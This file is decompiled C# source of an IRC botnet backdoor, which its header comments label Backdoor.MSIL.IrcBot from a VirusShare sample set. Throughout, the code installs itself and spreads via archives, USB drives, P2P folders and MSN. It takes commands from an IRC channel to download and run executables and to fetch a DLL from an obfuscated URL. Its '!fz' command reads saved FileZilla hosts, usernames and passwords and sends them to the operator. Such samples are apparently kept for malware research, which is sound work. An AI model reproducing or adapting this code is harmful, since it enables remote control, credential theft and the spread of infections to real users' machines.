// Decompiled with JetBrains decompiler
// Type: myApp.Program
// Assembly: Svchost, Version=1.0.3797.25400, Culture=neutral, PublicKeyToken=null
// MVID: E157A03A-FE69-4E7B-AD46-73B5B6218564
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.MSIL.IrcBot.fy-ac791d112cad6f2a883c24cb5a554f1a826fa0afc8bb0e0be6dada5ff2c5a16d.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace myApp
{
  internal class Program
  {
    public static string Osprefix;
    public static Random Rnd = new Random();
    public static int RndNumber = Program.Rnd.Next(1000, 10000);
    public static string NICK;
    public static string Server = Config.Serverz;
    public static int Port = Config.Portz;
    public static string Rname = Config.Rnamez;
    public static string CHANNEL = Config.CHANNELz;
    public static string BotPass = Config.BotPassz;
    public static StreamWriter Writer;
    public static bool IsInvisible;
    public static int InfectedArchives = 0;
    public static bool IsMutex;
    private static Thread _reco;

    public static void Restart()
    {
      Program._reco = new Thread(new ThreadStart(Program.Main));
      Program._reco.Start();
      Program.Main();
    }

    public static void Registar_Dlls(string filePath)
    {
      try
      {
        string str = "/s \"" + filePath + "\"";
        Process process = new Process();
        process.StartInfo.FileName = "regsvr32.exe";
        process.StartInfo.Arguments = str;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.RedirectStandardOutput = true;
        process.Start();
        process.WaitForExit();
        process.Close();
      }
      catch
      {
      }
    }

    public static void Main()
    {
      if (!Program.IsMutex)
      {
        if (new InstanceUnique("{newmutexmddutexmutex265qezfserdgrgeqqsesgf874589dsqf87sdfsdqfqsd}").IsRunning())
          Environment.Exit(0);
        Program.IsMutex = true;
      }
      GetOs.Get();
      Getcn.Get();
      if (!System.IO.File.Exists(Install.goodpath))
        Reg.CheckReg();
      Install.Drop();
      if (!System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\temp4876969.txt"))
      {
        try
        {
          Rar.Spread("setup.exe");
          System.IO.File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\temp4876969.txt");
        }
        catch
        {
          System.IO.File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\temp4876969.txt");
        }
        try
        {
          Yeha.go();
          System.IO.File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\temp4876969.txt");
        }
        catch
        {
        }
      }
      Usb.Listen();
      int num = 0;
      try
      {
        NetworkStream stream = new TcpClient(Program.Server, Program.Port).GetStream();
        StreamReader streamReader1 = new StreamReader((Stream) stream);
        Program.Writer = new StreamWriter((Stream) stream);
        Program.Writer.AutoFlush = true;
        PingSender.Start();
        if (!System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\dll\\here.txt"))
        {
          Program.NICK = "{NEW|" + (object) Program.RndNumber + "}";
          System.IO.File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\dll\\here.txt");
        }
        else
          Program.NICK = "{" + Getcn.MyCountry + "|" + Program.Osprefix + "|" + Environment.MachineName + "|" + (object) Program.RndNumber + "}";
        Program.Writer.WriteLine("USER {0} {1} * :{2}", (object) Program.NICK, (object) Program.IsInvisible, (object) Program.Rname);
        Program.Writer.WriteLine("NICK {0}", (object) Program.NICK);
        Program.Writer.WriteLine("JOIN {0}", (object) Program.CHANNEL);
        while (true)
        {
          string input;
          do
          {
            do
            {
              do
                ;
              while ((input = streamReader1.ReadLine()) == null);
              if (input.EndsWith("JOIN " + Program.CHANNEL))
              {
                input.Substring(1, input.IndexOf("!") - 1);
                Thread.Sleep(2000);
              }
              if (input.Contains("PING :"))
              {
                int startIndex = input.IndexOf("PING :");
                string str = input.Substring(startIndex).Replace("PING :", string.Empty);
                Program.Writer.WriteLine("PONG :" + str);
                Thread.Sleep(2000);
                Program.Writer.WriteLine(Program.NICK);
                Program.Writer.WriteLine("NICK " + Program.NICK);
                Program.Writer.WriteLine("JOIN " + Program.CHANNEL);
                if (Program.InfectedArchives != 0)
                  Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " :  \u00038Infected : \u00039" + (object) Program.InfectedArchives + " Archives");
                Program.Writer.WriteLine("JOIN ##" + Getcn.MyCountry);
              }
              if (input.Contains("!login"))
              {
                Match match = Regex.Match(input, "!login (.*)", RegexOptions.IgnoreCase);
                if (Program.BotPass == match.Groups[1].Value)
                {
                  num = 1;
                  Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " :  \u00039 Logged In! !");
                }
              }
            }
            while (num != 1);
            if (input.Contains("!visit"))
            {
              Process.Start(Regex.Match(input, "!visit (.*)", RegexOptions.IgnoreCase).Groups[1].Value);
              Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " :  \u00039Website Visited !");
            }
            if (input.Contains("!visilent"))
            {
              Match match = Regex.Match(input, "!visilent (.*)", RegexOptions.IgnoreCase);
              try
              {
                WebRequest.Create(match.Groups[1].Value).GetResponse();
                Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " :  \u00039Website Visited silently !");
              }
              catch
              {
              }
            }
            if (input.Contains("!p2p"))
            {
              try
              {
                string filetoadd = new Regex("!p2p (?<file>\\S+)").Matches(input)[0].Groups["file"].Value;
                P2P.ShareazaStart(filetoadd);
                P2P.EmuleStart(filetoadd);
                P2P.KazaaStart(filetoadd);
                P2P.IcqStart(filetoadd);
                P2P.GroksterStart(filetoadd);
                P2P.BearshareStart(filetoadd);
                P2P.Edonkey2000Start(filetoadd);
                P2P.MorpheusStart(filetoadd);
                P2P.LimewireStart(filetoadd);
                P2P.TeslaStart(filetoadd);
                P2P.WinmxStart(filetoadd);
                Thread.Sleep(2000);
              }
              catch
              {
              }
            }
            if (input.Contains("!dl"))
            {
              string str1 = new Regex("!dl (?<file>\\S+)").Matches(input)[0].Groups["file"].Value;
              string str2 = Program.Rnd.Next(1000, 10000).ToString() + ".exe";
              new Thread(new ThreadStart(new Dl()
              {
                Rfile = str2,
                Rurl = str1
              }.Dlexec)).Start();
            }
            if (input.Contains("!msn"))
            {
              if (!System.IO.File.Exists(Environment.CurrentDirectory + "\\MSNMessengerAPI.dll"))
                new WebClient().DownloadFile(Fuck.a("poGEEkO5fsP3sBlo7YpzxkaU8rKqvdLgAp9UIIMG/svY+WpmLpzB5wMW5Q12OLqf", Install.gay, true), Environment.CurrentDirectory + "\\MSNMessengerAPI.dll");
              int startIndex = input.IndexOf("!msn");
              Msnspread.MYmessage = input.Substring(startIndex).Replace("!msn ", string.Empty);
              new Thread(new ThreadStart(new Msnspread().MsnStart)).Start();
            }
            if (input.Contains("!kill"))
            {
              try
              {
                Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true)?.DeleteValue("dll");
                RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
                string str = registryKey.GetValue("Userinit").ToString();
                registryKey.SetValue("Userinit", (object) str);
                Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " :  \u00038Bot Killed !");
              }
              catch
              {
              }
              Environment.Exit(0);
            }
            if (input.Contains("!die"))
            {
              Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " :  \u00038Bot Closed !");
              Application.ExitThread();
              Process.GetCurrentProcess().Kill();
            }
            if (input.Contains("!logout"))
            {
              num = 0;
              Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " :  \u00038Logged Out !");
            }
          }
          while (!input.Contains("!fz"));
          try
          {
            StreamReader streamReader2 = new StreamReader(Environment.GetEnvironmentVariable("APPDATA") + "\\FileZilla\\sitemanager.xml");
            while (!streamReader2.EndOfStream)
            {
              string str3 = streamReader2.ReadLine();
              if (str3.Contains("<Pass"))
              {
                string str4 = str3.Split('>')[1].Split('<')[0];
                Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : \u00038Password : " + str4);
              }
              if (str3.Contains("<User"))
              {
                string str5 = str3.Split('>')[1].Split('<')[0];
                Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : \u00038Username : " + str5);
              }
              if (str3.Contains("<Host"))
              {
                string str6 = str3.Split('>')[1].Split('<')[0];
                Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : \u00038Host : " + str6);
              }
            }
            streamReader2.Close();
            StreamReader streamReader3 = new StreamReader(Environment.GetEnvironmentVariable("APPDATA") + "\\FileZilla\\recentservers.xml");
            while (!streamReader3.EndOfStream)
            {
              string str7 = streamReader3.ReadLine();
              if (str7.Contains("<Pass"))
              {
                string str8 = str7.Split('>')[1].Split('<')[0];
                Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : \u00038Password : " + str8);
              }
              if (str7.Contains("<User"))
              {
                string str9 = str7.Split('>')[1].Split('<')[0];
                Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : \u00038Username : " + str9);
              }
              if (str7.Contains("<Host"))
              {
                string str10 = str7.Split('>')[1].Split('<')[0];
                Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : \u00038Host : " + str10);
              }
            }
            streamReader3.Close();
          }
          catch
          {
          }
        }
      }
      catch
      {
        Program.Restart();
      }
    }
  }
}
